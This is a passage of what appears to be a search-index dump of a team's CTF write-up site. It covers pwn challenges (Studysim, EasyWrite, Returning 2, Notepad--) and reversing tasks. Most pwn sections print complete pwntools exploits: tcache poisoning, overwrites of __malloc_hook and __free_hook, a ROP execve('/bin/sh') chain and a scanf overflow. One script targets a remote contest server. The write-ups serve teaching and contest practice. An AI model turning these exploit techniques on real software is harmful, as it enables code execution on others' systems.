u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",p64(one_gadget)) do(2) #call system k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",'0') k.interactive()","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#studysim","text":"This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep >","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#add","text":"Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added.","title":"Add"},{"location":"pwning/HSCTF20/studysim/#do","text":"Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7fc6760 0x0000000000000000 0x404030 <stdin@@GLIBC_2.2.5>: 0x00007ffff7fc5a00 0x0000000000000000 0x404040 <allocated_count>: 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 <stack>: 0x0000000000000000 0x0000000000000000 0x404070 <stack+16>: 0x0000000000000000 0x0000000000000000 0x404080 <stack+32>: 0x0000000000000000 0x0000000000000000 0x404090 <stack+48>: 0x0000000000000000 0x0000000000000000","title":"Do"},{"location":"pwning/HSCTF20/studysim/#sleep","text":"Well, it just sleeps and exits. Nothing interesting here.","title":"Sleep"},{"location":"pwning/HSCTF20/studysim/#getting-the-leaks","text":"To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. > For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 <-- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 <-- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 <-- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000","title":"Getting the Leaks"},{"location":"pwning/HSCTF20/studysim/#final-exploit","text":"By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process(\"./studysim\",env = {\"LD_PRELOAD\" : \"./libc.so.6\"}) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(size)) k.sendlineafter(\"worksheet?\\n\",content) def do(count): k.sendlineafter(\"> \",\"do\") k.sendlineafter(\"finish?\\n\",str(count)) def sleep(): k.sendlineafter(\"> \",\"sleep\") stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil(\"Only \") heap_leak = int(k.recvline().strip().split(\" \")[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",'a') k.recvuntil(\"worksheet \") leak = k.recvline().strip().split(\" \")[0].replace(\"'\",\"\") leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",p64(one_gadget)) do(2) #call system k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",'0') k.interactive()","title":"Final Exploit"},{"location":"pwning/N1CTF20/easywrite/","text":"EasyWrite The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started! Initial Click All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy. What did not work? On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy. Crux: Controlling Tcache We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 . What happened next? Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) => system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed. Exploit from pwn import * p = process(\"./easy\",env = {\"LD_PRELOAD\" : \"./libc-2.31.so\"}) p.recvuntil(\"Here is your gift:\") leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info(\"libc_start = \" + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter(\"Input your message:\",fake_tcache) p.sendafter(\"Where to write?:\",p64(tls_tcache)) p.sendafter(\"Any last message?:\",\"/bin/sh\\x00\"+p64(system)) p.interactive()","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#easywrite","text":"The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started!","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#initial-click","text":"All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy.","title":"Initial Click"},{"location":"pwning/N1CTF20/easywrite/#what-did-not-work","text":"On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy.","title":"What did not work?"},{"location":"pwning/N1CTF20/easywrite/#crux-controlling-tcache","text":"We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 .","title":"Crux: Controlling Tcache"},{"location":"pwning/N1CTF20/easywrite/#what-happened-next","text":"Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) => system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed.","title":"What happened next?"},{"location":"pwning/N1CTF20/easywrite/#exploit","text":"from pwn import * p = process(\"./easy\",env = {\"LD_PRELOAD\" : \"./libc-2.31.so\"}) p.recvuntil(\"Here is your gift:\") leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info(\"libc_start = \" + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter(\"Input your message:\",fake_tcache) p.sendafter(\"Where to write?:\",p64(tls_tcache)) p.sendafter(\"Any last message?:\",\"/bin/sh\\x00\"+p64(system)) p.interactive()","title":"Exploit"},{"location":"pwning/ShakitCTF21/intro/","text":"ShaktiCTF April 2021 Birdie Singal dROPper Returning2 Cache7","title":"ShaktiCTF April 2021"},{"location":"pwning/ShakitCTF21/intro/#shaktictf-april-2021","text":"Birdie Singal dROPper Returning2 Cache7","title":"ShaktiCTF April 2021"},{"location":"pwning/ShakitCTF21/returning2/","text":"ShaktiCTF'21: Returning 2 Author: Shruti (@rudyerudite) This was a fairly beginner friendly challenge with a clear 120-byte overflow. We also see an alloca function which is used to allocate space on the stack. I gave an allocation of -40 so that I get the allocation at RBP. Note that PIE is diasbled here. By using ROPgadget tool we can find the required ROP gadgets for crafting the exploit payload. As '/bin/sh' cannot be found in the binary and nor we can write it at .bss, thus we have to find and address in binary with permissions rw . I chose to overwrite an address in the .data section. You can see the permissions of different sections in the binary by executing vmmap in GDB and finding the required address. Thus, I used the mov QWORD PTR [rdi],rax gadget with rax having the string '/bin/sh' and rdi pointing to the address 0x601040 . Next, we can do the execve syscall. Here's the final exploit for the challenge: from pwn import * r = process(\"./chall\") pop_rax = p64(0x000000000040079a) pop_rdx = p64(0x0000000000400788) pop_rdi = p64(0x000000000040077f) pop_rsi = p64(0x0000000000400791) mov = p64(0x400774) syscall = p64(0x00000000004007a3) exp = 'a'*0x8 exp += pop_rdi + p64(0x0000000000601040) exp += pop_rax + \"/bin/sh\\x00\" exp += mov exp += pop_rsi + p64(0) exp += pop_rdx + p64(0) exp += pop_rax + p64(0x3b) exp += syscall exp += p64(0x000000000040059e) print(len(exp)) r.sendline(str(-40)) r.sendlineafter(\"text:\\n\",exp) r.interactive()","title":"ShaktiCTF'21: Returning 2"},{"location":"pwning/ShakitCTF21/returning2/#shaktictf21-returning-2","text":"Author: Shruti (@rudyerudite) This was a fairly beginner friendly challenge with a clear 120-byte overflow. We also see an alloca function which is used to allocate space on the stack. I gave an allocation of -40 so that I get the allocation at RBP. Note that PIE is diasbled here. By using ROPgadget tool we can find the required ROP gadgets for crafting the exploit payload. As '/bin/sh' cannot be found in the binary and nor we can write it at .bss, thus we have to find and address in binary with permissions rw . I chose to overwrite an address in the .data section. You can see the permissions of different sections in the binary by executing vmmap in GDB and finding the required address. Thus, I used the mov QWORD PTR [rdi],rax gadget with rax having the string '/bin/sh' and rdi pointing to the address 0x601040 . Next, we can do the execve syscall. Here's the final exploit for the challenge: from pwn import * r = process(\"./chall\") pop_rax = p64(0x000000000040079a) pop_rdx = p64(0x0000000000400788) pop_rdi = p64(0x000000000040077f) pop_rsi = p64(0x0000000000400791) mov = p64(0x400774) syscall = p64(0x00000000004007a3) exp = 'a'*0x8 exp += pop_rdi + p64(0x0000000000601040) exp += pop_rax + \"/bin/sh\\x00\" exp += mov exp += pop_rsi + p64(0) exp += pop_rdx + p64(0) exp += pop_rax + p64(0x3b) exp += syscall exp += p64(0x000000000040059e) print(len(exp)) r.sendline(str(-40)) r.sendlineafter(\"text:\\n\",exp) r.interactive()","title":"ShaktiCTF'21: Returning 2"},{"location":"pwning/VolgaCTF20/notepad/","text":"Notepad-- This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY. Reversing The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit > The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook \"aaaaaaa\" [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit > This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab->size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on! Vulnerability and the exploit Getting the leaks As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using! Overwriting the free_hook The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts(\"You've reached the limit for notebooks! Delete some of the older once first!\"); v1 = nb_ctr++; v2 = (char *)&table + 2072 * v1; printf(\"Enter notebook name: \"); return __isoc99_scanf(\"%s\", v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook->number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs->data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!! Exploit Code from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter('>','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter('>','l') def dele_note(idx): r.sendlineafter('>','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter('>','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter('>','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter('>','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter('>','l') def update_tab(idx,name,length,data): r.sendlineafter('>','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter('>','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter('>','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#notepad-","text":"This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY.","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#reversing","text":"The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit > The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook \"aaaaaaa\" [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit > This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab->size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on!","title":"Reversing"},{"location":"pwning/VolgaCTF20/notepad/#vulnerability-and-the-exploit","text":"","title":"Vulnerability and the exploit"},{"location":"pwning/VolgaCTF20/notepad/#getting-the-leaks","text":"As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using!","title":"Getting the leaks"},{"location":"pwning/VolgaCTF20/notepad/#overwriting-the-free_hook","text":"The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts(\"You've reached the limit for notebooks! Delete some of the older once first!\"); v1 = nb_ctr++; v2 = (char *)&table + 2072 * v1; printf(\"Enter notebook name: \"); return __isoc99_scanf(\"%s\", v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook->number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs->data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!!","title":"Overwriting the free_hook"},{"location":"pwning/VolgaCTF20/notepad/#exploit-code","text":"from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter('>','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter('>','l') def dele_note(idx): r.sendlineafter('>','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter('>','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter('>','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter('>','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter('>','l') def update_tab(idx,name,length,data): r.sendlineafter('>','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter('>','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter('>','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Exploit Code"},{"location":"reversing/intro/","text":"Reversing Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category. The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - By @sandrabeme APLab:Statistics - By @sandrabeme APLab:English - By @sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - By @sandrabeme ShaktiCTF21 Maragaret - @sandrabeme deceev - @sandrabeme fusk - @sandrabeme","title":"Reversing"},{"location":"reversing/intro/#reversing","text":"","title":"Reversing"},{"location":"reversing/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category.","title":"Introduction"},{"location":"reversing/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - By @sandrabeme APLab:Statistics - By @sandrabeme APLab:English - By @sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - By @sandrabeme ShaktiCTF21 Maragaret - @sandrabeme deceev - @sandrabeme fusk - @sandrabeme","title":"The contents of this repo"},{"location":"reversing/ByteBandits20/auto_bot/","text":"Auto_bot Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil(\"\\n\") flag.write(str(o)) out = base64.b64decode(o) n=open(\"new\",\"wb\") n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project(\"./new\") initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b\"good job\" in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/auto_bot/#auto_bot","text":"Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil(\"\\n\") flag.write(str(o)) out = base64.b64decode(o) n=open(\"new\",\"wb\") n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project(\"./new\") initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b\"good job\" in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/baby_rust/","text":"Baby_Rust Analysing it dynamically gets us to xoring instructions: d =\"adhmp`badO|sL}JuvvFmiui{@IO}QQVR\" k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/ByteBandits20/baby_rust/#baby_rust","text":"Analysing it dynamically gets us to xoring instructions: d =\"adhmp`badO|sL}JuvvFmiui{@IO}QQVR\" k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/DarkCTF/Jack/","text":"Emojis - Misc HSCTF2020 Description We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script. Solution Script import 